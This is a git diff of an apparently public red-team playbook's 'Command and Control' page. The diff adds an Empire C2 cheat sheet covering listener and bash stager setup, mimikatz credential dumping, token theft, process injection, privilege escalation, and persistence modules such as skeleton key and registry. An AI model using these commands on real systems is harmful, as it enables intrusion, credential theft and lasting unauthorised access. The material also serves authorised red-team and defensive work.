@@ -1,5 +1,10 @@
 # 6 Command and Control
 
+## Table of Contents
+
+- [C2 Installation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#C2-Installation)
+- [Empire](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#Empire)
+
 | Name | Description | URL |
 | --- | --- | --- |
 | Mythic | A cross-platform, post-exploit, red teaming framework built with python3, docker, docker-compose, and a web browser UI. | https://github.com/its-a-feature/Mythic |
@@ -64,8 +69,9 @@ root@c2:~# chown root /home/c2ops/.ssh/authorized_keys
 
 ### iptables
 
-```c
 * Create iptables.sh in /root/.scripts/
+
+```c
 root@c2:~/.scripts# cat iptables.sh
 #!/bin/bash
 
@@ -495,6 +501,82 @@ c2ops@c2:~/opt/wordlists/rockyou$ gunzip rockyou.txt.gz
 ```c
 c2ops@c2:~/opt/wordlists$ git clone https://github.com/danielmiessler/SecLists.git
 ```
+
+## Empire
+
+### Basic Commands
+
+```c
+(Empire) > listeners                      // list current running listeners
+(Empire) > uselistener                    // configure listener
+(Empire) > agents                         // list available agents
+(Empire) > kill <NAME>                    // kill a specific agent
+(Empire: listeners/http) > info           // provide information about used listener or module
+(Empire: listeners/http) > back           // get back from current menu
+(Empire: listeners) > usestager           // creating payloads
+(Empire: agents) > rename <NAME> <NAME>   // renaming specific agent
+(Empire: agents) > interact <NAME>        // interacting with specific agent
+(Empire: agents) > searchmodule <NAME>    // search for a specific module
+(Empire: <NAME>) > usemodule <NAME>       // use a specific module
+(Empire: <NAME>) > sysinfo                // show system information
+(Empire: <NAME>) > creds                  // show credentials
+(Empire: <NAME>) > download               // download files
+(Empire: <NAME>) > upload                 // upload files
+(Empire: <NAME>) > sleep <60>             // set agent communication to sleep for 60 seconds
+(Empire: <NAME>) > steal_token            // impersonate access token
+(Empire: <NAME>) > shell [cmd]            // open a shell with cmd.exe
+(Empire: <NAME>) > ps                     // show running processes
+(Empire: <NAME>) > psinject               // inject agent to another process
+(Empire: <NAME>) > scriptimport           // load powershell script
+(Empire: <NAME>) > mimikatz               // executes sekurlsa::logonpasswords
+(Empire: <NAME>) > usemodule privesc/getsystem            // try privilege escalation
+(Empire: <NAME>) > usemodule privesc/sherlock             // run sherlock
+(Empire: <NAME>) > usemodule privesc/powerup/allchecks    // perform privilege escalation checks
+(Empire: <NAME>) > usemodule situational_awareness/host/antivirusproduct    // provides information about antivirus products
+(Empire: <NAME>) > usemodule situational_awareness/host/applockerstatus     // provides information about applocker status
+(Empire: <NAME>) > usemodule situational_awareness/host/computerdetails     // provides information about event ids 4648 (RDP) and 4624 (successful logon)
+(Empire: <NAME>) > situational_awareness/network/get_spn                       // provides information about spns
+(Empire: <NAME>) > situational_awareness/network/powerview/get_domain_trust    // show information about domain trusts
+(Empire: <NAME>) > situational_awareness/network/powerview/map_domain_trust    // map information about domain trust
+(Empire: <NAME>) > situational_awareness/network/bloodhound3                   // load bloodhound module
+(Empire: <NAME>/situational_awareness/network/bloodhound3) > set CollectionMethodAll    // configure bloodhound module
+(Empire: <NAME>/situational_awareness/network/bloodhound3) > run                        // run the module
+(Empire: <NAME>) > download *bloodhound*                                                // download the module
+(Empire: <NAME>) > usemodule powershell/persistence/elevated/registry    // registry persistence
+(Empire: <NAME>) > usemodule persistence/misc/add_sid_history            // sid history persistence
+(Empire: <NAME>) > usemodule persistence/misc/memssp                     // ssp persistence
+(Empire: <NAME>) > usemodule persistence/misc/skeleton_key               // skeleton key persistence
+(Empire: <NAME>) > usemodule persistence/elevated/wmi                    // wmi persistence
+```
+
+### Setup HTTP Listener
+
+```c
+(Empire) > listeners http
+(Empire: listeners/http) > info
+(Empire: listeners/http) > set Name <NAME>
+(Empire: listeners/http) > set Host <LHOST>
+(Empire: listeners/http) > set Port <Port>
+(Empire: listeners/http) > exeute
+```
+
+### Setup Stager
+
+```c
+(Empire: listeners) > usestager multi/bash
+(Empire: listeners/multi/bash) > set Listener <NAME>
+(Empire: listeners/multi/bash) > set OutFile /PATH/TO/FILE/<FILE>.sh
+(Empire: listeners/multi/bash) > execute
+```
+
+### Setup Persistence Measures
+
+```c
+(Empire: <NAME>) > usemodule powershell/persistence/elevated/registry
+(Empire: <NAME>/powershell/persistence/elevated/registry) > set Listener <NAME>
+(Empire: <NAME>/powershell/persistence/elevated/registry) > run
+```
+
 
 ### Previous
 
